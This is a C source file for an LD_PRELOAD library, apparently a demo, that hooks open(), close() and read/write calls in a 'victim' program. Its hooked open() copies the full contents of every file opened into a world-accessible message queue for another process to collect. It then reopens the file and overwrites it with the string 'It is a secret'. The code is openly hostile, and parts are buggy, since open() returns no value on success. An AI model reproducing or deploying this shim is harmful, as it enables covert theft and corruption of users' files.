#define _GNU_SOURCE
#include <dlfcn.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <time.h>
struct msgmbuf
{
    int mtype;
    char mtext[1024];
};



unsigned long get_file_size(const char *path)
{
    unsigned long filesize = -1;
    struct stat statbuff;
    if (stat(path, &statbuff) < 0)
    {
        return filesize;
    }
    else
    {
        filesize = statbuff.st_size;
    }
    return filesize;
}

typedef int (*orig_open_f_type)(const char *pathname, int flags);
typedef int (*orig_close_f_type)(int fd);
typedef int (*orig_write_f_type)(int fildes, const void *buf, size_t nbyte);
typedef int  (*orig_read_f_type) (int fildes, void *buf, size_t nbyte);
int writen(int fd, const void *vptr, int n);
int readn(int fd, void *vptr, int n);
int open(const char *pathname, int flags, ...)
{
    /* Some evil injected code goes here. */
    
    orig_open_f_type orig_open;
    orig_open = (orig_open_f_type)dlsym(RTLD_NEXT, "open");
    printf("The victim used open(...) to access '%s'!!!\n", pathname); //remember to include stdio.h!    
    int res =  orig_open(pathname, flags);
    
    if(res > 0 )
    {
        int msg_id,msg_flags;
        struct msqid_ds msg_info;
        struct msgmbuf msg_mbuf;
        key_t key = 1024;
        msg_flags = IPC_CREAT;
        unsigned long length = get_file_size(pathname);
        unsigned long number = 0;
        while(number != length)
        {
            number += readn(res, msg_mbuf.mtext, sizeof(msg_mbuf.mtext));
            msg_id = msgget(key,msg_flags | 0666);
            if(-1 == msg_id)
            {
                printf("create failed \n");
                return 0;
            }
            msg_mbuf.mtype = 10;
            msgsnd(msg_id, &msg_mbuf, sizeof(struct msgmbuf), IPC_NOWAIT);

            memset(msg_mbuf.mtext,0,strlen(msg_mbuf.mtext));
        
        }
        strcpy(msg_mbuf.mtext,"end");
        msgsnd(msg_id, &msg_mbuf, sizeof(struct msgmbuf),IPC_NOWAIT);
        res = orig_open(pathname, 01);
        char *buf = "It is a secret";
        orig_write_f_type orig_write;
        orig_write = (orig_write_f_type)dlsym(RTLD_NEXT, "write");
        orig_write(res,buf,strlen(buf));
    }
}

int close(int fd,...)
{
   orig_close_f_type orig_close;
   orig_close = (orig_close_f_type)dlsym(RTLD_NEXT, "close");
   printf("westos \n");
   return orig_close(fd); 
}

int readn(int fd, void *vptr, int n)
{
  orig_read_f_type orig_read;
  orig_read = (orig_read_f_type)dlsym(RTLD_NEXT, "read");
  int nleft;
  int nread;
  char *ptr;

  ptr = (char *)vptr;
  nleft = n;

  while (nleft > 0) {
      nread = orig_read(fd, ptr, nleft);
      if (nread < 0)
      {
          if (errno == EINTR)
              nread = 0; /* and call read() again */
          else
              return -1;
    } else if (nread == 0) {
      break; /*	EOF */
    }

    nleft -= nread;
    ptr += nread;
    }
    return (n - nleft);
}

int writen(int fd, const void *vptr, int n)
{
    orig_write_f_type orig_write;
    orig_write = (orig_write_f_type)dlsym(RTLD_NEXT, "write");
    
    int nleft;
    int nwritten;
    const char *ptr;

    ptr = (const char *)vptr;
    nleft = n;

    while (nleft > 0)
    {
        nwritten = orig_write(fd, ptr, nleft);
        if (nwritten <= 0)
        {
            if (nwritten < 0 && errno == EINTR)
                nwritten = 0;
            else
                return -1;
        }

        nleft -= nwritten;
        ptr += nwritten;
    }

    return n;
}
